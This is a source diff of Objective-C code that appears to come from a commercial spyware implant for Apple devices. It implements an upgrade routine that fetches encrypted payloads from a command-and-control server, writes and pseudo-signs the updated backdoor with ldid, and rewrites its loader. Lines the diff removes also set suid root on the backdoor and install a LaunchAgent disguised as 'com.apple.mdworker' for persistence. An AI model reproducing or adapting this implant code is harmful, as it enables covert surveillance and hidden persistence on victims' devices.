@@ -38,124 +38,38 @@
 
 @interface UpgradeNetworkOperation (private)
 
-- (BOOL)_updateFilesForCoreUpgrade: (NSString *)upgradePath;
 - (BOOL)_saveAndSignBackdoor:(NSData*)fileData;
 - (BOOL)_saveDylibUpdate:(NSData*)fileData;
 @end
 
 @implementation UpgradeNetworkOperation (private)
 
-- (BOOL)_updateFilesForCoreUpgrade: (NSString *)upgradePath
-{
-  BOOL success = NO;
-  
-  //
-  // Forcing suid permission on the backdoor upgrade
-  //
-  u_long permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
-  NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
-  NSValue *owner      = [NSNumber numberWithInt: 0];
-  
-  NSDictionary *tempDictionary = [NSDictionary dictionaryWithObjectsAndKeys:
-                                  permission,
-                                  NSFilePosixPermissions,
-                                  owner,
-                                  NSFileOwnerAccountID,
-                                  nil];
-  
-  success = [[NSFileManager defaultManager] setAttributes: tempDictionary
-                                             ofItemAtPath: upgradePath
-                                                    error: nil];
-  
-  if (success == NO)
-    {
-#ifdef DEBUG_UPGRADE_NOP
-      errorLog(@"Error while changing attributes on the upgrade file");
-#endif
-      return success;
-    }
-  
-  //
-  // Once the backdoor has been written, edit the backdoor Loader in order to
-  // load the new updated backdoor upon reboot
-  //
-  NSString *backdoorLaunchAgent = [[NSString alloc] initWithFormat: @"%@", BACKDOOR_DAEMON_PLIST];
-  
-  NSString *_backdoorPath = [[[NSBundle mainBundle] executablePath]
-                             stringByReplacingOccurrencesOfString: gBackdoorName
-                                                       withString: gBackdoorUpdateName];
-  
-  [[NSFileManager defaultManager] removeItemAtPath: backdoorLaunchAgent
-                                             error: nil];
-  
-  NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 1];
-  
-  NSDictionary *innerDict;
-  
-  innerDict = [[NSDictionary alloc] initWithObjectsAndKeys:
-               @"com.apple.mdworker", @"Label",
-               [NSNumber numberWithBool: FALSE], @"OnDemand",
-               [NSArray arrayWithObjects: _backdoorPath, nil],
-               @"ProgramArguments", nil];
-  
-  [rootObj addEntriesFromDictionary: innerDict];
-  
-  success = [rootObj writeToFile: backdoorLaunchAgent
-                      atomically: NO];
-  
-  [backdoorLaunchAgent release];
-  
-  if (success == NO)
-    {
-#ifdef DEBUG_UPGRADE_NOP
-      errorLog(@"Error while writing backdoor launchAgent plist");
-#endif
-      return success;
-    }
-  
-  return YES;
-}
-
 - (BOOL)_saveDylibUpdate:(NSData*)fileData
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  BOOL bRet = FALSE;
-  
-  NSString *_upgradePath = [[NSString alloc] initWithFormat: @"/usr/lib/%@",
-                            gDylibName];
+  NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@", 
+                                                             [[NSBundle mainBundle] bundlePath], 
+                                                             RCS8_UPDATE_DYLIB];
   
   // Create clean files for ios hfs 
-  NSError *err = nil;
   [[NSFileManager defaultManager] removeItemAtPath: _upgradePath 
-                                             error: &err];
-#ifdef DEBUG
-  if (err != nil)
-    NSLog(@"%s: removing old dylib update with result %@", __FUNCTION__, err);
-#endif
-  
-  bRet = [fileData writeToFile: _upgradePath
-                    atomically: YES];
+                                             error: nil];
 
-#ifdef DEBUG
-  NSLog(@"%s: dylib upgrade gDylibName = %@ saved with status %d", 
-        __FUNCTION__, gDylibName, bRet);
-#endif
-  
-  //
+  [fileData writeToFile: _upgradePath
+             atomically: YES];
+
   // Forcing permission
-  //
   u_long permissions = (S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH);
   NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
   NSValue *owner = [NSNumber numberWithInt: 0];
   
-  [[NSFileManager defaultManager] changeFileAttributes:
-                                                 [NSDictionary dictionaryWithObjectsAndKeys:
-                                                  permission,
-                                                  NSFilePosixPermissions,
-                                                  owner,
-                                                  NSFileOwnerAccountID,
-                                                  nil] 
+  [[NSFileManager defaultManager] changeFileAttributes:[NSDictionary dictionaryWithObjectsAndKeys:
+                                                        permission,
+                                                        NSFilePosixPermissions,
+                                                        owner,
+                                                        NSFileOwnerAccountID,
+                                                        nil] 
                                                 atPath: _upgradePath];
   
   [_upgradePath release];
@@ -171,48 +85,34 @@
   
   BOOL bRet = FALSE;
   
-  NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
-                            [[NSBundle mainBundle] bundlePath],
-                            gBackdoorUpdateName];
+  NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@", 
+                                                             [[NSBundle mainBundle] bundlePath],
+                                                             gBackdoorUpdateName];
   
   // Create clean files for ios hfs 
-  NSError *err = nil;
   [[NSFileManager defaultManager] removeItemAtPath: _upgradePath 
-                                             error: &err];
-#ifdef DEBUG
-  if (err != nil)
-    NSLog(@"%s: removing old core update with result %@", __FUNCTION__, err);
-#endif
-  
-  
+                                             error: nil];
+                                              
   bRet = [fileData writeToFile: _upgradePath
                     atomically: YES];
   
-#ifdef DEBUG
-  NSLog(@"%s: backdoor upgrade gBackdoorUpdateName = %@ saved with status %d", 
-        __FUNCTION__, gBackdoorUpdateName, bRet);
-#endif
-  
-  //
   // Forcing permission
-  //
   u_long permissions = S_IRWXU;
   NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
   NSValue *owner = [NSNumber numberWithInt: 0];
   
-  [[NSFileManager defaultManager] changeFileAttributes:
-   [NSDictionary dictionaryWithObjectsAndKeys:
-    permission,
-    NSFilePosixPermissions,
-    owner,
-    NSFileOwnerAccountID,
-    nil] 
+  [[NSFileManager defaultManager] changeFileAttributes:[NSDictionary dictionaryWithObjectsAndKeys:
+                                                        permission,
+                                                        NSFilePosixPermissions,
+                                                        owner,
+                                                        NSFileOwnerAccountID,
+                                                        nil] 
                                                 atPath: _upgradePath];
+
+  [_upgradePath release];
   
-  //
   // Once the backdoor has been written, edit the backdoor Loader in order to
   // load the new updated backdoor upon reboot
-  //
   NSString *backdoorLoaderPath = [[[NSBundle mainBundle] bundlePath]
                                   stringByAppendingPathComponent: @"srv.sh"];
   
@@ -224,11 +124,7 @@
                                withString: gBackdoorUpdateName
                                   options: NSCaseInsensitiveSearch
                                     range: NSMakeRange(0, [fileContent length])];
-  
-#ifdef DEBUG
-  NSLog(@"%s: service file replaced with %@", __FUNCTION__, fileContent);
-#endif
-  
+ 
   NSData *updateData = [fileContent dataUsingEncoding: NSUTF8StringEncoding];
   
   [updateData writeToFile: backdoorLoaderPath
@@ -236,21 +132,13 @@
   
   pid_t pid = fork();
   
+  // XXX- if fail must not upgraded???
   if (pid == 0) 
-    {
-#ifdef DEBUG
-    NSLog(@"%s: launching ldid [%d]", __FUNCTION__, pid);
-#endif
     execlp("/usr/bin/ldid", "/usr/bin/ldid", "-S", [gBackdoorUpdateName UTF8String], NULL);
-    }
   
   int status;
   waitpid(pid, &status, 0);
-  
-#ifdef DEBUG
-  NSLog(@"%s: rebuilding macho pseudo sig = %d", __FUNCTION__, status);
-#endif
-  
+ 
   [_fileContent release];
   [fileContent release];
   
@@ -284,11 +172,7 @@
 }
 
 - (BOOL)perform
-{
-#ifdef DEBUG_UPGRADE_NOP
-  infoLog(@"");
-#endif
-  
+{ 
   uint32_t command              = PROTO_UPGRADE;
   NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
   NSMutableData *commandData    = [[NSMutableData alloc] initWithBytes: &command
@@ -296,16 +180,10 @@
   NSData *commandSha            = [commandData sha1Hash];
   
   [commandData appendData: commandSha];
-  
-#ifdef DEBUG_UPGRADE_NOP
-  infoLog(@"commandData: %@", commandData);
-#endif
-  
+
   [commandData encryptWithKey: gSessionKey];
   
-  //
   // Send encrypted message
-  //
   NSURLResponse *urlResponse    = nil;
   NSData *replyData             = nil;
   NSMutableData *replyDecrypted = nil;
@@ -315,31 +193,21 @@
 
   if (replyData == nil)
     {
-#ifdef DEBUG_UPGRADE_NOP
-      errorLog(@"empty reply from server");
-#endif
       [commandData release];
       [outerPool release];
-    
       return NO;
     }
   
   replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
   [replyDecrypted decryptWithKey: gSessionKey];
-  
-#ifdef DEBUG_UPGRADE_NOP
-  infoLog(@"replyDecrypted: %@", replyDecrypted);
-#endif
-  
+
   [replyDecrypted getBytes: &command
                     length: sizeof(uint32_t)];
   
   // remove padding
   [replyDecrypted removePadding];
-  
-  //
+
   // check integrity
-  //
   NSData *shaRemote;
   NSData *shaLocal;
   
@@ -354,47 +222,27 @@
     }
   @catch (NSException *e)
     {
-#ifdef DEBUG_UPGRADE_NOP
-      errorLog(@"exception on sha makerange (%@)", [e reason]);
-#endif
-      
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
-      
       return NO;
     }
   
   shaLocal = [shaLocal sha1Hash];
-  
-#ifdef DEBUG_UPGRADE_NOP
-  infoLog(@"shaRemote: %@", shaRemote);
-  infoLog(@"shaLocal : %@", shaLocal);
-#endif
-  
+ 
   if ([shaRemote isEqualToData: shaLocal] == NO)
-    {
-#ifdef DEBUG_UPGRADE_NOP
-      errorLog(@"sha mismatch");
-#endif
-      
+    {  
       [replyDecrypted release];
       [commandData release];
-      [outerPool release];
-      
+      [outerPool release];      
       return NO;
     }
   
   if (command != PROTO_OK)
-    {
-#ifdef DEBUG_UPGRADE_NOP
-      errorLog(@"No upload request available (command %d)", command);
-#endif
-      
+    {   
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
-      
       return NO;
     }
   
@@ -415,25 +263,13 @@
                          range: NSMakeRange(16 + filenameSize, sizeof(uint32_t))];
     }
   @catch (NSException *e)
-    {
-#ifdef DEBUG_UPGRADE_NOP
-      errorLog(@"exception on parameters makerange (%@)", [e reason]);
-#endif
-      
+    {    
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
-      
       return NO;
     }
-  
-#ifdef DEBUG_UPGRADE_NOP
-  infoLog(@"packetSize    : %d", packetSize);
-  infoLog(@"numOfFilesLeft: %d", numOfFilesLeft);
-  infoLog(@"filenameSize  : %d", filenameSize);
-  infoLog(@"fileSize      : %d", fileSize);
-#endif
-  
+
   NSData *stringData;
   NSData *fileContent;
   
@@ -446,14 +282,9 @@
     }
   @catch (NSException *e)
     {
-#ifdef DEBUG_UPGRADE_NOP
-      errorLog(@"exception on stringData makerange (%@)", [e reason]);
-#endif
-      
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
-      
       return NO;
     }
   
@@ -466,17 +297,9 @@
 #endif
     }
   else
-    {
-#ifdef DEBUG_UPGRADE_NOP
-      infoLog(@"filename: %@", filename);
-      infoLog(@"file content: %@", fileContent);
-#endif
-    
+    {  
       if ([filename isEqualToString: CORE_UPGRADE])
         {
-#ifdef DEBUG_UPGRADE_NOP
-          infoLog(@"Received a core upgrade");
-#endif
           if ([self _saveAndSignBackdoor: fileContent] == NO)
             {
 #ifdef DEBUG_UPGRADE_NOP
@@ -486,23 +309,12 @@
         }
       else if ([filename isEqualToString: DYLIB_UPGRADE])
         {
+          if ([self _saveDylibUpdate: fileContent] == NO)
+            {
 #ifdef DEBUG_UPGRADE_NOP
-          infoLog(@"Received a dylib upgrade");
+              errorLog(@"Error while updating files for dylib upgrade");
 #endif
-        if ([self _saveDylibUpdate: fileContent] == NO)
-          {
-#ifdef DEBUG_UPGRADE_NOP
-            errorLog(@"Error while updating files for dylib upgrade");
-#endif
-          }
-        }
-      else if ([filename isEqualToString: KEXT_UPGRADE])
-        {
-#ifdef DEBUG_UPGRADE_NOP
-          infoLog(@"Received a kext upgrade, not yet implemented");
-#endif
-          
-          // TODO: Update kext binary inside Resources subfolder
+            }
         }
       else
         {
@@ -518,9 +330,7 @@
   [commandData release];
   [outerPool release];
   
-  //
   // Get files until there's no one left
-  //
   if (numOfFilesLeft != 0)
     {
       return [self perform];
